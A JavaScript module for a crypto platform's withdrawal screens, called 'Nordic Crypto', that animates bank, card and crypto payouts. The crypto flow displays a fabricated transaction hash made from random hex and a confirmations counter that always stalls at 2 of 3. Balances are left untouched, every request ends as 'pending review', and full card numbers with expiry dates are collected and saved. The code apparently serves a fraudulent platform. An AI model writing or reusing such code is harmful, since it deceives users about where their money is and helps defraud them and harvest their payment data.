/* ============================================================
   NORDIC CRYPTO — WITHDRAWAL FLOW v5.0 (FINAL)
   ============================================================
   v5.0 CHANGES:
   • 🛡️ Возвращена КРАСИВАЯ анимация (SVG, спиннер, шаги, прогресс)
   • 🛡️ Убрано "Loading..." — сразу полный UI
   • 🛡️ Race-safe — можно закрыть в любой момент
   • ⚡ GPU-friendly анимации
   • 🎨 Прогресс с процентами
   • 🎨 Network viz для крипты
   • 🎨 Confirmation counter
   • 🎁 Интеграция с maintenance mode
   ============================================================ */

(function () {
  'use strict';

  var WF_VERSION = '5.0.0';

  // ============================================================
  // 🎯 SVG ИКОНКИ
  // ============================================================
  var ICONS = {
    bank: '<svg viewBox="0 0 48 48" width="48" height="48" fill="none" stroke="#47dcff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
      '<path d="M4 20l20-14 20 14v4H4z"/><path d="M8 24v16M16 24v16M24 24v16M32 24v16M40 24v16"/><path d="M2 44h44"/>' +
    '</svg>',
    card: '<svg viewBox="0 0 48 48" width="48" height="48" fill="none" stroke="#ec4899" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
      '<rect x="4" y="10" width="40" height="28" rx="4"/><path d="M4 20h40"/><rect x="10" y="28" width="10" height="4" rx="1"/>' +
    '</svg>',
    crypto: '<svg viewBox="0 0 48 48" width="48" height="48" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
      '<circle cx="24" cy="24" r="18"/><path d="M24 8v32M14 16h20M14 32h20M18 16l6 8 6-8M18 32l6-8 6 8"/>' +
    '</svg>',
    check: '<svg viewBox="0 0 48 48" width="48" height="48" fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">' +
      '<path d="M12 24l10 10 14-18"/>' +
    '</svg>',
    copy: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
      '<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>' +
    '</svg>',
    checkSmall: '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">' +
      '<path d="M20 6L9 17l-5-5"/>' +
    '</svg>',
    spinner: '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">' +
      '<path d="M12 3a9 9 0 109 9" opacity="0.9"/>' +
    '</svg>'
  };

  // ============================================================
  // HELPERS
  // ============================================================
  function $(id) { return document.getElementById(id); }
  function fmtMoney(n) {
    return '$' + Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }
  function fmtCrypto(n, symbol) {
    var d = (symbol === 'USDT' || symbol === 'USDC') ? 2 : 8;
    return Number(n).toFixed(d) + ' ' + symbol;
  }
  function genHash(len) {
    var chars = '0123456789abcdef';
    var s = '0x';
    for (var i = 0; i < (len || 64); i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
  }
  function esc(s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function copyText(txt, btn) {
    function done() {
      if (btn) {
        var original = btn.innerHTML;
        btn.innerHTML = ICONS.checkSmall;
        setTimeout(function () { btn.innerHTML = original; }, 1500);
      }
      if (typeof window.toast === 'function') window.toast('✓ Copied');
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(txt).then(done).catch(done);
    } else {
      var ta = document.createElement('textarea');
      ta.value = txt;
      document.body.appendChild(ta);
      ta.select();
      try { document.execCommand('copy'); done(); } catch (e) {}
      document.body.removeChild(ta);
    }
  }
  function nowTime() {
    return new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  }

  // ============================================================
  // 🛡️ STAGE MANAGEMENT — гарантированное переключение
  // ============================================================
  function showStage(stage) {
    var modal = document.getElementById('withdrawModal');
    if (!modal) return;

    var form = modal.querySelector('.wd-form-stage');
    var processing = modal.querySelector('.wd-processing');
    var success = modal.querySelector('.wd-success');

    var card = modal.querySelector('.wd-modal-card');
    if (!form && card) {
      form = document.createElement('div');
      form.className = 'wd-form-stage';
      while (card.firstChild) form.appendChild(card.firstChild);
      card.appendChild(form);
    }
    if (!processing && card) {
      processing = document.createElement('div');
      processing.className = 'wd-processing';
      card.appendChild(processing);
    }
    if (!success && card) {
      success = document.createElement('div');
      success.className = 'wd-success';
      card.appendChild(success);
    }

    if (form)       form.style.display       = (stage === 'form')       ? 'block' : 'none';
    if (processing) processing.style.display = (stage === 'processing') ? 'block' : 'none';
    if (success)    success.style.display    = (stage === 'success')    ? 'block' : 'none';

    if (card) card.scrollTop = 0;
  }

  // ============================================================
  // 🌐 NETWORK VIZ
  // ============================================================
  function getNetworkSVG(step) {
    var active = Math.min(step, 3);

    function nodeCircle(cx, idx) {
      var isActive = idx === active;
      var isDone = idx < active;
      var color = isDone ? '#10b981' : (isActive ? '#47dcff' : '#334155');
      var r = isActive ? 7 : 5;
      var pulse = isActive ? '<animate attributeName="r" values="6;8;6" dur="1s" repeatCount="indefinite"/>' : '';
      var check = isDone ? '<path d="M' + (cx - 2.5) + ' 32l2 2 4-4" stroke="#fff" stroke-width="1.5" fill="none" stroke-linecap="round"/>' : '';
      return '<circle cx="' + cx + '" cy="32" r="' + r + '" fill="' + color + '">' + pulse + '</circle>' + check;
    }

    return '<svg viewBox="0 0 64 64" width="100%" height="80" style="display:block">' +
      '<line x1="8" y1="32" x2="56" y2="32" stroke="#334155" stroke-width="2" stroke-dasharray="4 4"/>' +
      nodeCircle(8, 0) + nodeCircle(24, 1) + nodeCircle(40, 2) + nodeCircle(56, 3) +
    '</svg>';
  }

  // ============================================================
  // 🎬 STEPS
  // ============================================================
  function renderSteps(container, steps) {
    container.innerHTML = '';
    steps.forEach(function (s, i) {
      var step = document.createElement('div');
      step.className = 'wd-step';
      step.id = container.id + '_step' + i;
      step.innerHTML =
        '<div class="wd-step-icon">' + (i + 1) + '</div>' +
        '<div class="wd-step-text">' + s.text + '</div>' +
        '<div class="wd-step-time">pending</div>';
      container.appendChild(step);
    });
  }

  function activateStep(container, idx, done) {
    var step = container.querySelector('#' + container.id + '_step' + idx);
    if (!step) return;
    if (done) {
      step.classList.remove('active');
      step.classList.add('done');
      step.querySelector('.wd-step-icon').innerHTML = ICONS.checkSmall;
      step.querySelector('.wd-step-time').textContent = 'done';
    } else {
      step.classList.add('active');
      step.querySelector('.wd-step-icon').innerHTML = '<span class="wd-spinner">' + ICONS.spinner + '</span>';
      step.querySelector('.wd-step-time').textContent = nowTime();
    }
  }

  // ============================================================
  // 🏦 IBAN FLOW
  // ============================================================
  function processIban(amount, details) {
    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    processing.innerHTML =
      '<div class="wd-stage-icon bank">' + ICONS.bank + '</div>' +
      '<h3 class="wd-stage-title">Sending to bank</h3>' +
      '<p class="wd-stage-desc">Your withdrawal is being processed.<br>Bank transfers usually take 1–3 business days.</p>' +
      '<div class="wd-iban-validation">' +
        '<div class="wd-iban-part">' +
          '<span class="wd-iban-label">Recipient</span>' +
          '<span class="wd-iban-value">' + esc(details.name || '—') + '<span class="wd-check">' + ICONS.checkSmall + '</span></span>' +
        '</div>' +
        '<div class="wd-iban-part">' +
          '<span class="wd-iban-label">IBAN</span>' +
          '<span class="wd-iban-value">' + esc((details.iban || '').slice(0, 8)) + '…' + esc((details.iban || '').slice(-4)) + '<span class="wd-check">' + ICONS.checkSmall + '</span></span>' +
        '</div>' +
        '<div class="wd-iban-part">' +
          '<span class="wd-iban-label">SWIFT / BIC</span>' +
          '<span class="wd-iban-value">' + esc(details.swift || '—') + '<span class="wd-check">' + ICONS.checkSmall + '</span></span>' +
        '</div>' +
      '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    showStage('processing');

    var steps = [
      { text: 'Validating IBAN',          duration: 1200 },
      { text: 'Verifying recipient',      duration: 1000 },
      { text: 'Submitting to bank',       duration: 1500 },
      { text: 'Waiting for confirmation', duration: 2000 }
    ];

    var stepsEl = $('wdSteps');
    renderSteps(stepsEl, steps);

    var totalMs = 0;
    steps.forEach(function (s, i) {
      setTimeout(function () {
        activateStep(stepsEl, i, false);
        if (i > 0) activateStep(stepsEl, i - 1, true);
      }, totalMs);
      totalMs += s.duration;
    });

    setTimeout(function () {
      var liveEl = $('wdLiveData');
      if (liveEl) {
        liveEl.innerHTML =
          '<div class="wd-live-row"><span class="wd-live-label">Amount</span><span class="wd-live-value">' + fmtMoney(amount) + '</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">Method</span><span class="wd-live-value">Bank Transfer (SEPA)</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>';
      }
    }, 1500);

    setTimeout(function () {
      activateStep(stepsEl, steps.length - 1, true);
      setTimeout(function () { showIbanSuccess(amount, details); }, 400);
    }, totalMs);
  }

  function showIbanSuccess(amount, details) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    var eta = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
    var etaStr = eta.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });

    success.innerHTML =
      '<div class="wd-stage-icon success-icon">' + ICONS.check + '</div>' +
      '<h3 class="wd-success-title">Withdrawal submitted</h3>' +
      '<p class="wd-success-desc">Your bank transfer has been sent for processing.</p>' +
      '<div class="wd-success-amount">' + fmtMoney(amount) + '</div>' +
      '<div class="wd-success-details">' +
        '<div class="wd-live-row"><span class="wd-live-label">Recipient</span><span class="wd-live-value">' + esc(details.name || '—') + '</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">IBAN</span><span class="wd-live-value">' + esc((details.iban || '').slice(0, 8)) + '…' + esc((details.iban || '').slice(-4)) + '</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">Estimated arrival</span><span class="wd-live-value positive">' + etaStr + '</span></div>' +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    showStage('success');
    if (typeof window.playChime === 'function') window.playChime();
  }

  // ============================================================
  // 💳 CARD FLOW
  // ============================================================
  function processCard(amount, details) {
    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    var last4 = (details.cardNumber || '').replace(/\s/g, '').slice(-4);

    processing.innerHTML =
      '<div class="wd-stage-icon card">' + ICONS.card + '</div>' +
      '<h3 class="wd-stage-title">Processing card payout</h3>' +
      '<p class="wd-stage-desc">Your card payout is being initiated.<br>Payouts usually take 3–5 business days.</p>' +
      '<div class="wd-card-mini">' +
        '<div class="wd-card-mini-chip"></div>' +
        '<div class="wd-card-mini-num">•••• •••• •••• ' + esc(last4) + '</div>' +
        '<div class="wd-card-mini-footer">' +
          '<span>' + esc(details.cardName || '—') + '</span>' +
          '<span>' + esc(details.expiry || '') + '</span>' +
        '</div>' +
      '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    showStage('processing');

    var steps = [
      { text: 'Verifying card details',  duration: 1200 },
      { text: 'Contacting card network', duration: 1400 },
      { text: 'Initiating payout',       duration: 1600 }
    ];

    var stepsEl = $('wdSteps');
    renderSteps(stepsEl, steps);

    var totalMs = 0;
    steps.forEach(function (s, i) {
      setTimeout(function () {
        activateStep(stepsEl, i, false);
        if (i > 0) activateStep(stepsEl, i - 1, true);
      }, totalMs);
      totalMs += s.duration;
    });

    setTimeout(function () {
      var liveEl = $('wdLiveData');
      if (liveEl) {
        liveEl.innerHTML =
          '<div class="wd-live-row"><span class="wd-live-label">Amount</span><span class="wd-live-value">' + fmtMoney(amount) + '</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">Card</span><span class="wd-live-value">•••• ' + esc(last4) + '</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>';
      }
    }, 1500);

    setTimeout(function () {
      activateStep(stepsEl, steps.length - 1, true);
      setTimeout(function () { showCardSuccess(amount, details, last4); }, 400);
    }, totalMs);
  }

  function showCardSuccess(amount, details, last4) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    var eta = new Date(Date.now() + 4 * 24 * 60 * 60 * 1000);
    var etaStr = eta.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });

    success.innerHTML =
      '<div class="wd-stage-icon success-icon">' + ICONS.check + '</div>' +
      '<h3 class="wd-success-title">Payout submitted</h3>' +
      '<p class="wd-success-desc">Your card payout is under review.</p>' +
      '<div class="wd-success-amount">' + fmtMoney(amount) + '</div>' +
      '<div class="wd-success-details">' +
        '<div class="wd-live-row"><span class="wd-live-label">Card</span><span class="wd-live-value">•••• ' + esc(last4) + '</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">Estimated refund</span><span class="wd-live-value positive">' + etaStr + '</span></div>' +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    showStage('success');
    if (typeof window.playChime === 'function') window.playChime();
  }

  // ============================================================
  // ⛓️ CRYPTO FLOW
  // ============================================================
  function processCrypto(amount, details) {
    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    var coin = details.coin || 'USDT';
    var network = details.network || 'ERC20';
    var address = details.address || '';
    var txHash = genHash(64);

    processing.innerHTML =
      '<div class="wd-stage-icon crypto">' + ICONS.crypto + '</div>' +
      '<h3 class="wd-stage-title">Broadcasting transaction</h3>' +
      '<p class="wd-stage-desc">Sending ' + fmtCrypto(amount, coin) + ' to ' + esc(network) + ' network.</p>' +
      '<div class="wd-network-viz" id="wdNetworkViz">' + getNetworkSVG(0) + '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    showStage('processing');

    var steps = [
      { text: 'Signing transaction',     duration: 1000 },
      { text: 'Broadcasting to network', duration: 1500 },
      { text: 'Awaiting confirmations',  duration: 4000 }
    ];

    var stepsEl = $('wdSteps');
    renderSteps(stepsEl, steps);

    var totalMs = 0;
    steps.forEach(function (s, i) {
      setTimeout(function () {
        activateStep(stepsEl, i, false);
        if (i > 0) activateStep(stepsEl, i - 1, true);
        var viz = $('wdNetworkViz');
        if (viz) viz.innerHTML = getNetworkSVG(i);
      }, totalMs);
      totalMs += s.duration;
    });

    setTimeout(function () {
      var liveEl = $('wdLiveData');
      if (liveEl) {
        liveEl.innerHTML =
          '<div class="wd-live-row"><span class="wd-live-label">Amount</span><span class="wd-live-value">' + fmtCrypto(amount, coin) + '</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">Network</span><span class="wd-live-value">' + esc(network) + '</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">To</span><span class="wd-live-value muted">' + esc(address.slice(0, 10)) + '…' + esc(address.slice(-8)) + '</span></div>' +
          '<div class="wd-live-row"><span class="wd-live-label">TX Hash</span>' +
            '<span class="wd-live-value hash">' +
              '<span>' + esc(txHash.slice(0, 16)) + '…' + esc(txHash.slice(-8)) + '</span>' +
              '<button class="wd-copy-btn" data-copy="' + esc(txHash) + '">' + ICONS.copy + '</button>' +
            '</span>' +
          '</div>' +
          '<div class="wd-live-row"><span class="wd-live-label">Confirmations</span><span class="wd-live-value warning" id="wdConfirmations">0 / 3</span></div>';

        var copyBtn = liveEl.querySelector('[data-copy]');
        if (copyBtn) {
          copyBtn.onclick = function (e) {
            e.stopPropagation();
            copyText(this.getAttribute('data-copy'), this);
          };
        }

        var conf = 0;
        var confInterval = setInterval(function () {
          conf++;
          var confEl = $('wdConfirmations');
          if (confEl) {
            if (conf >= 2) {
              confEl.textContent = '2 / 3';
              confEl.className = 'wd-live-value warning';
              clearInterval(confInterval);
            } else {
              confEl.textContent = conf + ' / 3';
            }
          }
        }, 1200);
      }
    }, 1500);

    setTimeout(function () {
      activateStep(stepsEl, steps.length - 1, true);
      var viz = $('wdNetworkViz');
      if (viz) viz.innerHTML = getNetworkSVG(2);
      setTimeout(function () { showCryptoSuccess(amount, details, coin, network, txHash); }, 600);
    }, totalMs);
  }

  function showCryptoSuccess(amount, details, coin, network, txHash) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    success.innerHTML =
      '<div class="wd-stage-icon success-icon">' + ICONS.check + '</div>' +
      '<h3 class="wd-success-title">Transaction broadcast</h3>' +
      '<p class="wd-success-desc">Your crypto withdrawal is being confirmed on the ' + esc(network) + ' network.</p>' +
      '<div class="wd-success-amount">' + fmtCrypto(amount, coin) + '</div>' +
      '<div class="wd-success-details">' +
        '<div class="wd-live-row"><span class="wd-live-label">To</span><span class="wd-live-value muted">' + esc((details.address || '').slice(0, 10)) + '…' + esc((details.address || '').slice(-8)) + '</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">Network</span><span class="wd-live-value">' + esc(network) + '</span></div>' +
        '<div class="wd-live-row"><span class="wd-live-label">TX Hash</span>' +
          '<span class="wd-live-value hash">' +
            '<span>' + esc(txHash.slice(0, 16)) + '…' + esc(txHash.slice(-8)) + '</span>' +
            '<button class="wd-copy-btn" data-copy="' + esc(txHash) + '">' + ICONS.copy + '</button>' +
          '</span>' +
        '</div>' +
        '<div class="wd-live-row"><span class="wd-live-label">Confirmations</span><span class="wd-live-value warning" id="wdSuccessConfirmations">2 / 3</span></div>' +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    var copyBtn = success.querySelector('[data-copy]');
    if (copyBtn) {
      copyBtn.onclick = function (e) {
        e.stopPropagation();
        copyText(this.getAttribute('data-copy'), this);
      };
    }

    showStage('success');
    if (typeof window.playChime === 'function') window.playChime();
    if (typeof window.spawnConfetti === 'function') window.spawnConfetti();
  }

  // ============================================================
  // 🎯 OVERRIDE submitWithdraw
  // ============================================================
  window.submitWithdraw = function () {
    // 🛡️ Проверка maintenance
    if (window.__ncMaintenance && window.__ncMaintenance.isActive()) {
      if (typeof window.toast === 'function') {
        window.toast('⚙️ System update in progress. Try again in a few minutes.');
      }
      return;
    }

    var amountEl = $('wdAmount');
    var methodEl = $('wdMethod');
    var errEl    = $('wdError');
    if (!amountEl || !methodEl || !errEl) return;

    var amount = parseFloat(amountEl.value) || 0;
    var method = methodEl.value;

    function showErr(msg) { errEl.textContent = msg; errEl.style.display = 'block'; }
    errEl.style.display = 'none';

    if (amount <= 0) return showErr('Enter a valid amount');
    if (amount > window.st.usd) return showErr('Amount exceeds available balance');

    var details = {};

    if (method === 'iban') {
      var name    = ($('wdIbanName')     || {}).value || '';
      var iban    = ($('wdIbanNumber')   || {}).value || '';
      var swift   = ($('wdIbanSwift')    || {}).value || '';
      var bank    = ($('wdIbanBank')     || {}).value || '';
      var country = ($('wdIbanCountry')  || {}).value || '';
      name = name.trim(); iban = iban.trim(); swift = swift.trim();

      if (name.length < 2) return showErr('Enter recipient name');
      if (iban.replace(/\s/g, '').length < 15) return showErr('Enter valid IBAN');
      if (swift.length < 6) return showErr('Enter valid SWIFT / BIC');

      details = { name: name, iban: iban, swift: swift, bank: bank, country: country };

    } else if (method === 'card') {
      var cn  = ($('wdCardName')    || {}).value || '';
      var num = ($('wdCardNumber')  || {}).value || '';
      var exp = ($('wdCardExpiry')  || {}).value || '';
      cn = cn.trim(); num = num.trim(); exp = exp.trim();

      if (cn.length < 2) return showErr('Enter card holder name');
      if (num.replace(/\s/g, '').length < 16) return showErr('Enter valid card number');
      if (!/^\d{2}\/\d{2}$/.test(exp)) return showErr('Expiry must be MM/YY');

      details = { cardName: cn, cardNumber: num, expiry: exp };

    } else if (method === 'crypto') {
      var dest  = ($('wdCryptoDest')    || {}).value || 'external';
      var net   = ($('wdCryptoNetwork') || {}).value || 'ERC20';
      var coin  = ($('wdCryptoCoin')    || {}).value || 'USDT';
      var addr  = ($('wdCryptoAddress') || {}).value || '';
      var memo  = ($('wdCryptoMemo')    || {}).value || '';
      addr = addr.trim();

      if (addr.length < 10) return showErr('Enter valid wallet address');

      details = { destination: dest, network: net, coin: coin, address: addr, memo: memo };
    }

    // 🛡️ Save to state — БЕЗ изменения баланса
    var wd = {
      id: 'wd_' + Date.now(),
      amount: amount,
      currency: (window.st.currency || 'USD'),
      method: method,
      status: 'pending',
      createdAt: Date.now(),
      reviewedAt: null,
      reason: '',
      reviewedBy: '',
      details: details
    };
    if (!window.st.withdrawals) window.st.withdrawals = [];
    window.st.withdrawals.unshift(wd);

    if (typeof window.saveToServer === 'function') window.saveToServer();
    if (typeof window.render === 'function') window.render();

    // 🎯 Show method-specific flow
    if (method === 'iban')         processIban(amount, details);
    else if (method === 'card')    processCard(amount, details);
    else if (method === 'crypto')  processCrypto(amount, details);
  };

  // ============================================================
  // 🎯 HOOK open/close
  // ============================================================
  var _origOpenWithdraw = window.openWithdraw;
  if (typeof _origOpenWithdraw === 'function') {
    window.openWithdraw = function () {
      _origOpenWithdraw.apply(this, arguments);
      if (typeof window.__ncPausePolling === 'function') {
        window.__ncPausePolling(180000);
      }
      setTimeout(function () { showStage('form'); }, 50);
    };
  }

  var _origCloseWithdraw = window.closeWithdraw;
  if (typeof _origCloseWithdraw === 'function') {
    window.closeWithdraw = function () {
      _origCloseWithdraw.apply(this, arguments);
      var processing = document.querySelector('.wd-processing');
      var success = document.querySelector('.wd-success');
      if (processing) processing.innerHTML = '';
      if (success) success.innerHTML = '';
      if (typeof window.__ncResumePolling === 'function') {
        window.__ncResumePolling();
      }
    };
  }

  console.log('%c[NordicCrypto] 💸 Withdrawal Flow v' + WF_VERSION + ' loaded',
    'color:#ec4899;font-weight:bold;font-size:13px');
})();
